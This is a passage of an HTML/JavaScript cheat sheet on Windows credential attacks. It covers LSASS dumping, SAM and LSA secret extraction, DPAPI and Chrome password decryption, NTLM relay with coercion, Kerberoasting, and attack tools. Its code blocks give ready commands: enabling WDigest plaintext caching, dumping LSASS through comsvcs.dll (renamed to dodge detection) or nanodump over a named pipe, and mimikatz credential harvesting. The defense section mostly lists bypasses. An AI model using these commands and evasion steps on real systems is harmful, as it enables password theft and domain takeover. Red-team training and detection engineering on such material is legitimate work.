<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Credential Attacks & DPAPI Reference</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#08090c;color:#e5e7eb;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}.mono{font-family:'Cascadia Code','IBM Plex Mono','Fira Code',monospace}.off{color:#ef4444;font-weight:600;font-size:.82em}.hd{padding:10px 14px 0;border-bottom:1px solid #1a1d27;background:linear-gradient(180deg,#0c0e14,#08090c)}.hd h1{font-size:1em;font-weight:800;background:linear-gradient(135deg,#fbbf24,#f87171,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.hd .sub{font-size:.62em;color:#374151}.st{display:flex;gap:1px;overflow-x:auto;flex-wrap:wrap}.sb{padding:4px 7px;border:none;cursor:pointer;border-radius:6px 6px 0 0;font-size:.66em;font-weight:600;white-space:nowrap;background:transparent;color:#374151;border-bottom:2px solid transparent;transition:all .15s}.sb.on{background:#111318}.sb[data-sc="kit"],.sb[data-sc="byp"]{border-left:2px solid #ffffff15;margin-left:4px}.ut{padding:0 14px;background:#0a0b10;border-bottom:1px solid #1a1d27;display:flex}.ub{padding:7px 12px;border:none;cursor:pointer;font-size:.7em;font-weight:600;background:transparent;color:#4b5563;border-bottom:2px solid transparent;display:flex;align-items:center;gap:4px}.ub.on{color:#e5e7eb;border-bottom-color:#e5e7eb}.cnt{font-size:.82em;background:#1f2937;padding:0 4px;border-radius:6px;color:#9ca3af}.ct{padding:10px 14px;overflow-x:auto}.fr{display:flex;align-items:flex-start;gap:0;overflow-x:auto;padding:8px 0}.ar{display:flex;align-items:center;padding:0 4px;flex-shrink:0}.ar .ln{width:24px;height:2px;background:linear-gradient(90deg,#4b5563,#9ca3af)}.ar .tp{color:#9ca3af;font-size:13px;margin-left:-2px}.ar .lb{font-size:.62em;color:#6b7280;margin-left:3px;white-space:nowrap}.bx{background:#0d0f14;border-radius:8px;flex-shrink:0;overflow:hidden}.bx-h{padding:6px 10px;font-weight:700;font-size:.8em}.bx-s{font-size:.65em;color:#4b5563;margin-top:1px}.bx-b{padding:6px 10px}.fd{display:flex;gap:6px;padding:1.5px 0;font-size:.78em;align-items:baseline}.fd.hl{background:#ffffff08;border-radius:3px;padding:2px 4px}.fd .tp{color:#6b7280;font-size:.82em}.tg{display:inline-block;padding:1px 7px;border-radius:4px;font-size:.78em;font-weight:700}.tg-s{padding:0 5px;font-size:.68em}.nt{margin:6px 0;padding:7px 10px;border-radius:6px}.nt .nl{font-size:.6em;font-weight:800;letter-spacing:.08em;margin-bottom:2px}.nt .nb{color:#d1d5db;font-size:.78em;line-height:1.4}.cp{border:1px solid #1f2937;border-radius:8px;overflow:hidden;margin-bottom:6px}.ct2{width:100%;padding:8px 12px;border:none;cursor:pointer;text-align:left;background:#0d0f14;display:flex;align-items:center;gap:8px}.ct2:hover{background:#111827}.cv{color:#6b7280;font-size:12px;transition:transform .15s;display:inline-block}.cv.op{transform:rotate(90deg)}.ct2 .tl{color:#e5e7eb;font-size:.8em;font-weight:600;flex:1}.cb{margin:0;padding:10px 14px;background:#080a0f;font-size:.74em;line-height:1.5;color:#a5f3fc;overflow-x:auto;border-top:1px solid #1f2937;white-space:pre;tab-size:4}.cb .cm{color:#4b5563}.cb .pp{color:#f59e0b}.ti{border-radius:6px;overflow:hidden;border:1px solid #1f2937;background:#0a0c10;margin-bottom:3px}.ti.op{border-color:#f9731640;background:#f9731608}.tt{width:100%;padding:6px 10px;border:none;cursor:pointer;text-align:left;background:transparent;display:flex;align-items:center;gap:6px}.tt .tn{font-size:.78em;font-weight:600;color:#9ca3af}.ti.op .tn{color:#fdba74}.td{padding:4px 10px 8px 26px;color:#d1d5db;font-size:.76em;line-height:1.5}.nb2{padding:2px 6px;border:1px solid #1f2937;border-radius:4px;cursor:pointer;background:#0d0f14;color:#4b5563;font-size:.65em}.ft{padding:8px 14px;border-top:1px solid #1a1d27;display:flex;gap:8px;flex-wrap:wrap;font-size:.6em}.dt{width:6px;height:6px;border-radius:2px;display:inline-block}.grd{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px}
</style>
</head>
<body>
<div id="app"></div>
<script>
var $=function(s){return document.querySelector(s)};
var $$=function(s){return Array.prototype.slice.call(document.querySelectorAll(s))};
function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
var SE=[
{id:"lsa",l:"A. LSASS Internals",i:"\u{1F9EC}",c:"#f87171"},
{id:"dmp",l:"B. LSASS Dump Methods",i:"\u{1F4BE}",c:"#60a5fa"},
{id:"sam",l:"C. SAM / Registry",i:"\u{1F4CB}",c:"#a78bfa"},
{id:"dpa",l:"D. DPAPI Deep Dive",i:"\u{1F510}",c:"#fbbf24"},
{id:"ntl",l:"E. NTLM Relay",i:"\u{1F504}",c:"#34d399"},
{id:"krb",l:"F. Kerberos Creds",i:"\u{1F3AB}",c:"#f59e0b"},
{id:"vlt",l:"G. Vault / Cached",i:"\u{1F511}",c:"#e879f9"},
{id:"kit",l:"H. Toolkit",i:"\u{1F9F0}",c:"#f472b6"},
{id:"byp",l:"I. Defenses",i:"\u{1F6E1}\uFE0F",c:"#fb923c"}
];
var S={s:'lsa',t:'flow'};
function T(t,c,s){return '<span class="tg'+(s?' tg-s':'')+'\" style=\"background:'+c+'18;color:'+c+';border:1px solid '+c+'30\">'+t+'</span>'}
function A(l){return '<div class="ar"><div class="ln"></div><div class="tp">&#9658;</div>'+(l?'<div class="lb">'+l+'</div>':'')+'</div>'}
function B(t,c,b,w,s){return '<div class="bx" style="min-width:'+(w||220)+'px;max-width:'+(w?w+100:330)+'px;border:1px solid '+c+'35"><div class="bx-h" style="color:'+c+';border-bottom:1px solid '+c+'20;background:linear-gradient(135deg,'+c+'12,'+c+'05)">'+t+(s?'<div class="bx-s">'+s+'</div>':'')+'</div><div class="bx-b">'+b+'</div></div>'}
function F(o,n,t,hl){return '<div class="fd'+(hl?' hl':'')+'\">'+(o?'<code class="mono off">'+o+'</code> ':'')+' <span style="flex:1">'+n+'</span>'+(t?'<span class="tp mono">'+t+'</span>':'')+'</div>'}
function N(l,c,b){return '<div class="nt" style="background:'+c+'08;border:1px solid '+c+'25"><div class="nl" style="color:'+c+'">'+l+'</div><div class="nb">'+b+'</div></div>'}
function CRD(icon,title,color,body){return '<div style="border-radius:8px;border:1px solid '+color+'25;background:'+color+'06;overflow:hidden"><div style="padding:8px 10px;color:'+color+';border-bottom:1px solid '+color+'15;font-weight:700;font-size:.76em">'+icon+' '+title+'</div><div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">'+body+'</div></div>'}
function fLSA(){
var h='<div style="font-size:.72em;font-weight:800;color:#f87171;letter-spacing:.06em;margin-bottom:6px">LSASS INTERNALS & CREDENTIAL CACHING</div>';
h+='<div class="fr">';
h+=B("User Logon","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Interactive / network / service logon","")+F("","Password or Kerberos ticket presented","")+F("","Winlogon \u2192 LsaLogonUser()","")+'</div>',200);
h+=A("auth");
h+=B("LSASS.exe","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Dispatches to loaded SSPs","")+F("","Credentials cached in SSP memory","")+F("","Multiple SSPs process same logon","")+F("","Runs as SYSTEM, stores secrets in heap","")+'</div>',260);
h+=A("stores");
h+=B("SSP Memory","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","NTLM hash, Kerberos tickets","")+F("","Plaintext if WDigest enabled","")+F("","Session keys, smartcard PINs","")+F("","Persists until logoff or reboot","")+'</div>',220);
h+='</div>';
h+='<div class="grd" style="margin-top:8px">';
h+=CRD("\u{1F9EC}","Security Support Providers (SSPs)","#f87171",F("msv1_0.dll","NTLM authentication. Caches: NT hash, LM hash (if enabled), plaintext (if WDigest)","",true)+F("kerberos.dll","Kerberos. Caches: TGT, service tickets, session keys, encryption keys","",true)+F("wdigest.dll","Digest auth. Caches plaintext password in reversible form. Disabled by default Win8.1+","",true)+F("tspkg.dll","TermService (RDP). Caches plaintext creds for RDP SSO","",true)+F("credman","Credential Manager. Cached stored credentials (web, network)","",true)+F("livessp.dll","Microsoft Account. Caches MSA credentials","",true));
h+=CRD("\u{1F50D}","What Lives in LSASS Memory","#f87171",F("","NTLM hashes: always cached on interactive logon","")+F("","Kerberos TGT + session key: cached after domain auth","")+F("","Plaintext passwords: WDigest (UseLogonCredential=1) or tspkg","")+F("","Derived keys: AES128/256 Kerberos session keys","")+F("","Smartcard PIN: cached for re-authentication","")+F("","DPAPI master key cache: recent user master keys",""));
h+=CRD("\u{1F527}","WDigest Plaintext Creds","#f87171",F("","Win8.1+: disabled by default (UseLogonCredential=0)","")+F("","Enable: HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest","")+F("","UseLogonCredential = 1 (DWORD)","")+F("","Requires user to re-logon after change","")+F("","Pre-Win8.1: always caches plaintext",""));
h+=CRD("\u{1F4CA}","Logon Session Types","#f87171",F("Type 2","Interactive: console logon. Caches everything.","",true)+F("Type 3","Network: SMB, WinRM. Caches NTLM hash only (no TGT).","",true)+F("Type 9","NewCredentials: runas /netonly. Caches creds for outbound.","",true)+F("Type 10","RemoteInteractive: RDP. Caches like interactive.","",true)+F("Type 11","CachedInteractive: domain cached credentials (DCC2).","",true));
h+='</div>';return h;
}
function fDMP(){
var h='<div style="font-size:.72em;font-weight:800;color:#60a5fa;letter-spacing:.06em;margin-bottom:6px">LSASS DUMP METHODS</div>';
h+='<div class="grd">';
var methods=[
{n:"comsvcs.dll MiniDump",d:"LOLBin: rundll32 comsvcs.dll MiniDump PID file full. Built-in, no tools needed. Heavily signatured.",c:"#f87171",det:"\u274C High"},
{n:"ProcDump (Sysinternals)",d:"procdump -ma lsass.exe out.dmp. Microsoft-signed. Flagged by Defender as credential theft tool.",c:"#60a5fa",det:"\u274C High"},
{n:"Nanodump",d:"Syscall-based MiniDumpWriteDump. Unhooks ntdll first. Multiple output formats. Avoids usermode hooks.",c:"#34d399",det:"\u2705 Low"},
{n:"HandleDuplication",d:"Open handle to lsass via another process. DuplicateHandle from existing handle holder (csrss, etc).",c:"#a78bfa",det:"\u26A0 Medium"},
{n:"SSP Injection (mimilib)",d:"Register custom SSP DLL in LSASS. Logs plaintext passwords on future logons. Persistent.",c:"#fbbf24",det:"\u26A0 Medium"},
{n:"Silent Process Exit",d:"Configure lsass to dump on crash via WER. Trigger benign exception. Dump written to configured path.",c:"#e879f9",det:"\u26A0 Medium"},
{n:"Direct Syscall Dump",d:"NtReadVirtualMemory on LSASS with direct syscalls. Manual minidump construction. Bypasses hooks + ETW.",c:"#34d399",det:"\u2705 Low"},
{n:"PPLFault / PPLdump",d:"Exploit PPL implementation bugs to read LSASS. Works against RunAsPPL. Requires specific OS builds.",c:"#f59e0b",det:"\u26A0 Medium"},
{n:"LSASS Shtinkering",d:"Abuse Windows Error Reporting to trigger LSASS dump. WerFault.exe creates dump in controlled location.",c:"#f472b6",det:"\u26A0 Medium"},
{n:"MirrorDump",d:"Write minidump to named pipe instead of file. Avoids file-on-disk. Pipe reader encrypts in flight.",c:"#fb923c",det:"\u2705 Low"}
];
methods.forEach(function(m){h+='<div style="border-radius:6px;border:1px solid '+m.c+'20;background:'+m.c+'06;padding:5px 8px"><div style="display:flex;justify-content:space-between;align-items:baseline"><span style="font-weight:700;color:'+m.c+';font-size:.72em">'+m.n+'</span><span style="font-size:.58em">'+m.det+'</span></div><div style="font-size:.64em;color:#9ca3af;margin-top:1px">'+m.d+'</div></div>';});
h+='</div>';return h;
}
function fSAM(){
var h='<div style="font-size:.72em;font-weight:800;color:#a78bfa;letter-spacing:.06em;margin-bottom:6px">SAM / REGISTRY CREDENTIAL EXTRACTION</div>';
h+='<div class="fr">';
h+=B("SAM + SYSTEM + SECURITY","#a78bfa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","SAM: hashed local account passwords","")+F("","SYSTEM: contains syskey (boot key)","")+F("","SECURITY: LSA secrets, cached domain creds","")+'</div>',240);
h+=A("extract");
h+=B("Offline Decrypt","#a78bfa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Syskey from SYSTEM decrypts SAM","")+F("","NT hashes extracted","")+F("","secretsdump.py / mimikatz","")+'</div>',200);
h+=A("crack");
h+=B("Use Hashes","#a78bfa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Pass-the-Hash (PTH)","")+F("","Offline cracking (hashcat/john)","")+F("","Local admin reuse across hosts","")+'</div>',200);
h+='</div>';
h+='<div class="grd" style="margin-top:8px">';
h+=CRD("\u{1F4CB}","Extraction Methods","#a78bfa",F("","reg save HKLM\\SAM sam.bak (requires SYSTEM/admin)","")+F("","reg save HKLM\\SYSTEM system.bak","")+F("","reg save HKLM\\SECURITY security.bak","")+F("","Volume Shadow Copy: access locked hives via VSS snapshot","")+F("","Raw NTFS read: NtfsUndelete, rawcopy, fget bypasses locks",""));
h+=CRD("\u{1F510}","Syskey / Boot Key Derivation","#a78bfa",F("","Syskey stored across 4 registry keys in SYSTEM hive","")+F("","JD, Skew1, GBG, Data under HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa","")+F("","Class names of these keys (not values) contain the syskey","")+F("","16-byte syskey derived from concatenation + permutation","")+F("","Syskey decrypts the SAM hive F/V structures",""));
h+=CRD("\u{1F527}","LSA Secrets","#a78bfa",F("","SECURITY hive contains encrypted LSA secrets","")+F("","$MACHINE.ACC: computer account password (NTLM hash)","")+F("","DefaultPassword: autologon password if configured","")+F("","Service account passwords (for services with stored creds)","")+F("","DPAPI_SYSTEM: machine DPAPI master keys","")+F("","Decryption: syskey \u2192 LSA key \u2192 secret decryption",""));
h+=CRD("\u{1F4CA}","Domain Cached Credentials (DCC2)","#a78bfa",F("","SECURITY\\Cache: last 10 domain logons (by default)","")+F("","MS-CacheDCC2: PBKDF2(NTLM_hash, username, 10240 iterations)","")+F("","Very slow to crack (10240 PBKDF2 rounds)","")+F("","hashcat mode 2100 / john --format=mscash2","")+F("","Cannot be used for PTH (derived hash, not NTLM)",""));
h+='</div>';return h;
}
function fDPA(){
var h='<div style="font-size:.72em;font-weight:800;color:#fbbf24;letter-spacing:.06em;margin-bottom:6px">DPAPI DEEP DIVE</div>';
h+='<div class="grd">';
h+=CRD("\u{1F510}","DPAPI Architecture","#fbbf24",F("","CryptProtectData / CryptUnprotectData API","")+F("","User master key: derived from password + SID + PBKDF2","")+F("","Machine master key: derived from DPAPI_SYSTEM LSA secret","")+F("","Master key encrypted, stored in %APPDATA%\\Microsoft\\Protect\\<SID>","")+F("","Domain backup key: DC can decrypt any user master key",""));
h+=CRD("\u{1F511}","Master Key Derivation Chain","#fbbf24",F("1.","User password \u2192 SHA1","")+F("2.","SHA1 + SID + PBKDF2 (HMAC-SHA512, 8000-15000 rounds)","")+F("3.","Result = master key decryption key","")+F("4.","Decrypts master key file in Protect folder","")+F("5.","Master key decrypts DPAPI blobs","")+F("","Domain backup key on DC bypasses steps 1-3",""));
h+=CRD("\u{1F4CB}","DPAPI Blob Structure","#fbbf24",F("+0x00","dwVersion (0x01000000)","")+F("+0x04","guidProvider (DPAPI GUID)","")+F("+0x14","guidMasterKey (which master key to use)","")+F("+0x24","dwFlags","")+F("+0x28","algCrypt (AES-256 or 3DES)","")+F("+0x2C","dwCryptLen / salt / HMAC / encrypted data",""));
h+=CRD("\u{1F310}","Chrome / Edge Credential Decryption","#fbbf24",F("1.","Chrome stores encrypted_key in Local State (JSON, base64)","")+F("2.","encrypted_key is DPAPI blob (user scope)","")+F("3.","Decrypt DPAPI blob \u2192 AES-GCM key","")+F("4.","Login Data (SQLite): action_url, username, password_value","")+F("5.","password_value: v10 prefix + 12-byte nonce + AES-GCM ciphertext","")+F("6.","AES-GCM decrypt with key from step 3",""));
h+=CRD("\u{1F527}","Domain Backup Key Attack","#fbbf24",F("","DC stores domain DPAPI backup key","")+F("","mimikatz: lsadump::backupkeys /export","")+F("","Can decrypt ANY user's master keys domain-wide","")+F("","Requires: Domain Admin or DC compromise","")+F("","Persists: backup key rarely rotated",""));
h+=CRD("\u{1F4E6}","Other DPAPI-Protected Secrets","#fbbf24",F("","WiFi passwords: %ProgramData%\\Microsoft\\Wlansvc\\Profiles","")+F("","Scheduled task credentials: DPAPI blob in registry","")+F("","RDP saved credentials: .rdg files + Credential Manager","")+F("","EFS private keys: DPAPI-encrypted in user profile","")+F("","Windows Vault entries: DPAPI protection",""));
h+='</div>';return h;
}
function fNTL(){
var h='<div style="font-size:.72em;font-weight:800;color:#34d399;letter-spacing:.06em;margin-bottom:6px">NTLM RELAY ATTACKS</div>';
h+='<div class="fr">';
h+=B("Coerce Auth","#34d399",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","PetitPotam (EfsRpcOpenFileRaw)","")+F("","PrinterBug (SpoolService)","")+F("","DFSCoerce, ShadowCoerce","")+'</div>',210);
h+=A("NTLM");
h+=B("Relay (ntlmrelayx)","#34d399",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Capture NTLM type1/2/3","")+F("","Forward to different target","")+F("","Auth as coerced machine/user","")+'</div>',220);
h+=A("attack");
h+=B("Target Service","#34d399",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","LDAP: RBCD, shadow creds, add user","")+F("","SMB: code exec, file access","")+F("","HTTP/ADCS: certificate request","")+'</div>',220);
h+='</div>';
h+='<div class="grd" style="margin-top:8px">';
h+=CRD("\u{1F504}","Coercion Methods","#34d399",F("PetitPotam","EfsRpcOpenFileRaw to \\\\attacker\\share. No auth needed on unpatched DCs.","",true)+F("PrinterBug","RpcRemoteFindFirstPrinterChangeNotificationEx. Requires auth (any domain user).","",true)+F("DFSCoerce","NetrDfsRemoveStdRoot. Similar to PetitPotam. Auth required.","",true)+F("ShadowCoerce","FsrmFileManagementJobManager. Requires FSRM role installed.","",true)+F("WebDAV","Trick via search connector or .searchConnector-ms file. HTTP-based coercion.","",true));
h+=CRD("\u{1F3AF}","Relay to LDAP (Most Powerful)","#34d399",F("","Requires: no LDAP signing enforcement (common default)","")+F("","RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity","")+F("","Shadow Credentials: write msDS-KeyCredentialLink","")+F("","Add computer: MAQ (MachineAccountQuota) > 0","")+F("","Modify ACL: grant attacker rights on target object",""));
h+=CRD("\u{1F512}","Relay to ADCS (ESC8)","#34d399",F("","Relay to HTTP enrollment endpoint","")+F("","Request certificate as coerced machine account","")+F("","Use cert for PKINIT \u2192 TGT for machine account","")+F("","Machine account TGT \u2192 DCSync if DC","")+F("","Critical: PetitPotam + ADCS ESC8 = instant DC compromise",""));
h+=CRD("\u{1F50D}","Relay vs Crack Decision","#34d399",F("","Relay: use auth live against another service (no cracking)","")+F("","Crack: capture NTLMv2 hash, offline brute force","")+F("","Relay is instant (if signable service available)","")+F("","Crack depends on password strength","")+F("","Always try relay first; capture hash as fallback",""));
h+='</div>';
h+=N("SIGNING KILLS RELAY","#34d399","SMB signing enabled = cannot relay to SMB. LDAP signing enforced = cannot relay to LDAP. EPA on HTTPS = cannot relay to HTTPS. Check targets with <b>crackmapexec smb targets --gen-relay-list</b> to find relay-able hosts.");
return h;
}
function fKRB(){
var h='<div style="font-size:.72em;font-weight:800;color:#f59e0b;letter-spacing:.06em;margin-bottom:6px">KERBEROS CREDENTIAL ATTACKS</div>';
h+='<div class="grd">';
h+=CRD("\u{1F3AB}","Kerberoasting","#f59e0b",F("","Request TGS for any SPN-registered service account","")+F("","TGS encrypted with service account password hash","")+F("","Offline crack: hashcat -m 13100 (RC4) or -m 19700 (AES)","")+F("","RC4 tickets much faster to crack than AES","")+F("","GetUserSPNs.py or Rubeus kerberoast",""));
h+=CRD("\u{1F50D}","AS-REP Roasting","#f59e0b",F("","Targets accounts with DONT_REQUIRE_PREAUTH","")+F("","Request AS-REP without knowing password","")+F("","Response encrypted with user's key \u2192 offline crack","")+F("","hashcat -m 18200","")+F("","GetNPUsers.py or Rubeus asreproast",""));
h+=CRD("\u{1F511}","Ticket Extraction","#f59e0b",F("","TGT in current session: klist / Rubeus dump","")+F("","Export: Rubeus dump /service:krbtgt (base64 .kirbi)","")+F("","Linux: ccache file in /tmp/krb5cc_<uid>","")+F("","Convert: ticketConverter.py kirbi<->ccache","")+F("","Inject: Rubeus ptt /ticket:base64; export KRB5CCNAME",""));
h+=CRD("\u{1F504}","Unconstrained Delegation Harvest","#f59e0b",F("","Server with unconstrained delegation caches TGTs","")+F("","Any user authenticating to it: TGT stored in memory","")+F("","Coerce DC to authenticate \u2192 DC TGT captured","")+F("","Rubeus monitor /interval:5 on delegation server","")+F("","SpoolService bug / PetitPotam to trigger DC auth",""));
h+=CRD("\u{1F510}","PKINIT (Certificate-Based Auth)","#f59e0b",F("","Authenticate with X.509 certificate instead of password","")+F("","Stolen cert + key \u2192 request TGT via PKINIT","")+F("","certipy auth -pfx user.pfx -dc-ip DC_IP","")+F("","PKINIT TGT can be used for U2U to recover NTLM hash","")+F("","Shadow Credentials: forge cert for msDS-KeyCredentialLink",""));
h+='</div>';return h;
}
function fVLT(){
var h='<div style="font-size:.72em;font-weight:800;color:#e879f9;letter-spacing:.06em;margin-bottom:6px">VAULT, CACHED CREDS & BROWSER SECRETS</div>';
h+='<div class="grd">';
h+=CRD("\u{1F511}","Windows Credential Manager","#e879f9",F("","Stores: web credentials, Windows credentials","")+F("","vaultcmd /listcreds:\"Windows Credentials\"","")+F("","cmdkey /list (shows saved RDP, SMB creds)","")+F("","Protected by DPAPI (user master key)","")+F("","Stored: %LOCALAPPDATA%\\Microsoft\\Credentials\\",""));
h+=CRD("\u{1F4CB}","Domain Cached Credentials (DCC2)","#e879f9",F("","Last N domain logons cached locally (default 10)","")+F("","Allows logon when DC unreachable","")+F("","MSCASH2: PBKDF2(NT_hash, lowercase_username, 10240)","")+F("","Cannot PTH with DCC2 (it's a derived hash)","")+F("","Only useful for offline cracking \u2192 password recovery",""));
h+=CRD("\u{1F310}","Browser Stored Passwords","#e879f9",F("","Chrome/Edge: Login Data SQLite + Local State key","")+F("","Decryption chain: DPAPI blob \u2192 AES key \u2192 AES-GCM","")+F("","Firefox: logins.json + key4.db (NSS / PBKDF2/SHA256)","")+F("","SharpChromium, HackBrowserData, LaZagne","")+F("","Cookies: same DPAPI chain (session hijacking)",""));
h+=CRD("\u{1F4F6}","WiFi Credentials","#e879f9",F("","netsh wlan show profiles","")+F("","netsh wlan show profile name=SSID key=clear","")+F("","Stored in: %ProgramData%\\Microsoft\\Wlansvc\\Profiles\\","")+F("","Machine DPAPI scope (DPAPI_SYSTEM LSA secret)","")+F("","WPA2-Enterprise: may contain domain creds",""));
h+=CRD("\u{1F4BE}","RDP Saved Credentials","#e879f9",F("","Stored in Credential Manager (DPAPI protected)","")+F("","mstsc /savecred stores after first use","")+F("",".rdp files: may contain password hash","")+F("","Remote Desktop Connection Manager (.rdg): XML with DPAPI blobs","")+F("","Decrypt: DPAPI masterkey + blob extraction",""));
h+='</div>';return h;
}
function fKIT(){
var h='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">CREDENTIAL ATTACK DECISION TREE</div>';
h+='<div class="grd" style="margin-bottom:10px">';
h+=CRD("\u{1F4CA}","By Access Level","#f472b6",F("Local Admin","LSASS dump, SAM extract, DPAPI user keys, token theft","",true)+F("Domain User","Kerberoast, AS-REP roast, NTLM relay (coerce), LDAP enum","",true)+F("Domain Admin","DCSync, NTDS.dit, domain backup key, golden ticket forge","",true)+F("SYSTEM","SAM/SECURITY extract, LSA secrets, machine DPAPI, service creds","",true)+F("No Creds","LLMNR/NBNS poison (Responder), NTLM relay via coercion, password spray","",true));
h+='</div>';
h+='<div class="grd">';
var tools=[
{n:"mimikatz",d:"sekurlsa::logonpasswords, lsadump::sam, lsadump::dcsync, dpapi::masterkey, kerberos::list. The standard.",c:"#f87171"},
{n:"secretsdump.py",d:"Impacket. Remote: DCSync, SAM dump via registry. Local: SAM+SYSTEM+SECURITY offline parsing.",c:"#60a5fa"},
{n:"Rubeus",d:"Kerberos toolkit. Kerberoast, AS-REP roast, ticket dump/inject/renew, S4U abuse, delegation attacks.",c:"#a78bfa"},
{n:"nanodump",d:"Stealthy LSASS dump. Direct syscalls, unhooking, multiple output formats. Designed for EDR evasion.",c:"#34d399"},
{n:"Responder",d:"LLMNR/NBNS/mDNS poisoner. Captures NTLMv2 hashes from name resolution. Built-in rogue services.",c:"#fbbf24"},
{n:"ntlmrelayx.py",d:"Impacket NTLM relay. Relay to SMB/LDAP/HTTP/MSSQL. RBCD, shadow creds, ADCS ESC8 attacks.",c:"#e879f9"},
{n:"SharpDPAPI",d:"C# DPAPI toolkit. Triage machine/user creds, masterkey decrypt, Chrome/credential/vault decryption.",c:"#f59e0b"},
{n:"LaZagne",d:"Multi-source credential recovery. Browsers, mail, WiFi, sysadmin tools, databases. Python, cross-platform.",c:"#f472b6"}
];
tools.forEach(function(t){h+='<div style="border-radius:6px;border:1px solid '+t.c+'20;background:'+t.c+'06;padding:5px 8px"><div style="font-weight:700;color:'+t.c+';font-size:.72em">'+t.n+'</div><div style="font-size:.64em;color:#9ca3af;margin-top:1px">'+t.d+'</div></div>';});
h+='</div>';return h;
}
function fBYP(){
var h='<div style="font-size:.72em;font-weight:800;color:#fb923c;letter-spacing:.06em;margin-bottom:6px">DEFENSES & BYPASS</div>';
h+='<div class="grd">';
h+=CRD("\u{1F6E1}\uFE0F","Credential Guard","#fb923c",F("","Isolates LSASS secrets in VTL1 (hypervisor)","")+F("","Blocks: mimikatz sekurlsa, NTLM hash extraction from LSASS","")+F("","Does NOT protect: Kerberos tickets, DPAPI, SAM, DCSync","")+F("","Bypass: DCSync (network), Kerberoast, DPAPI backup key",""));
h+=CRD("\u{1F510}","RunAsPPL (LSASS PPL)","#fb923c",F("","LSASS runs as Protected Process Light","")+F("","Blocks: OpenProcess, ReadProcessMemory on LSASS","")+F("","Bypass: PPLFault, PPLdump (exploit PPL implementation)","")+F("","Bypass: BYOVD kernel driver reads LSASS memory","")+F("","Bypass: mimidrv.sys (mimikatz kernel driver)",""));
h+=CRD("\u{1F511}","LAPS (Local Admin Password Solution)","#fb923c",F("","Randomizes local admin passwords per machine","")+F("","Password stored in AD: ms-Mcs-AdmPwd attribute","")+F("","Prevents: local admin password reuse across hosts","")+F("","Bypass: read LAPS attribute if you have ACL read rights","")+F("","Windows LAPS (new): encrypted password in AD",""));
h+=CRD("\u{1F504}","SMB/LDAP Signing","#fb923c",F("","SMB signing: prevents NTLM relay to SMB targets","")+F("","LDAP signing: prevents NTLM relay to LDAP targets","")+F("","EPA (Extended Protection): prevents relay to HTTPS/LDAPS","")+F("","Default: DCs require signing; member servers don't","")+F("","Check: crackmapexec or nmap smb-security-mode",""));
h+=CRD("\u{1F4CA}","Kerberos Hardening","#fb923c",F("","AES-only: disable RC4 \u2192 Kerberoast much slower to crack","")+F("","gMSA: managed service accounts with auto-rotating passwords","")+F("","Protected Users group: no NTLM, no delegation, no caching","")+F("","Kerberos armoring (FAST): encrypts pre-auth exchange",""));
h+=CRD("\u{1F50D}","Detection Points","#fb923c",F("","Event 4624/4625: logon success/failure (Type 3 = network)","")+F("","Event 4688: process creation (watch for: lsass access tools)","")+F("","Event 4662: DCSync (Replicating Directory Changes audit)","")+F("","Sysmon 10: ProcessAccess on lsass.exe","")+F("","Sysmon 1: comsvcs.dll, procdump, nanodump command lines",""));
h+='</div>';return h;
}
function getCodes(s){
var C={};
C.lsa=[
{t:"Enable WDigest plaintext caching",l:"ps",c:"# Enable WDigest plaintext credential caching\n# Requires admin. User must re-logon after change.\n\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n\n# Verify:\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential\n\n# Wait for user to re-logon (lock/unlock, RDP, etc.)\n# Then: mimikatz sekurlsa::wdigest shows plaintext\n\n# Disable after capture (cleanup):\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f\n\n# Alternative: inject custom SSP for future logons\n# mimikatz misc::memssp\n# Logs plaintext to C:\\Windows\\System32\\mimilsa.log\n# Persists until reboot (memory-only)"}
];
C.dmp=[
{t:"LSASS dump: comsvcs (LOLBin) + nanodump",l:"bash",c:"# Method 1: comsvcs.dll MiniDump (LOLBin)\n# Get LSASS PID:\ntasklist /fi \"imagename eq lsass.exe\"\n# Or: Get-Process lsass | Select Id\n\n# Dump (must run from SYSTEM or admin):\nrundll32.exe comsvcs.dll, MiniDump <PID> C:\\temp\\out.dmp full\n\n# Evasion: copy comsvcs.dll and rename\ncopy C:\\Windows\\System32\\comsvcs.dll C:\\temp\\foo.dll\nrundll32.exe C:\\temp\\foo.dll, MiniDump <PID> C:\\temp\\out.dmp full\n\n# Method 2: nanodump (stealthy)\nnanodump.exe --write C:\\temp\\nano.dmp\n# Or: dump to named pipe (no file on disk)\nnanodump.exe --write \\\\.\\pipe\\nanopipe\n# Reader on pipe receives encrypted dump\n\n# Method 3: Direct syscall dump (manual)\n# NtOpenProcess(LSASS_PID)\n# NtReadVirtualMemory(regions)\n# Construct MiniDump format manually\n# Avoids: MiniDumpWriteDump API hook by EDR\n\n# Parse any dump offline:\nmimikatz: sekurlsa::minidump out.dmp\nmimikatz: 